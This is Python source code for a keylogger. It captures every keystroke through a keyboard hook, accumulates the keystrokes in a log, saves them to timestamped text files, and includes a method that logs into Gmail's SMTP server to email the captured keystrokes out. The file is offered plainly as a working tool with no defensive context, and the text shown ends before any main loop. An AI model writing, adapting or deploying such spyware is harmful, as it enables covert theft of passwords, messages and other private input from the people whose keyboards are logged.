import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import os
from dotenv import load_dotenv

load_dotenv()

SEND_RESULTS = 60
email_address = os.getenv("EMAIL_ADDRESS")
password = os.getenv("EMAIL_PASSWORD")

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}"
        self.log += name
        print(self.log)

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
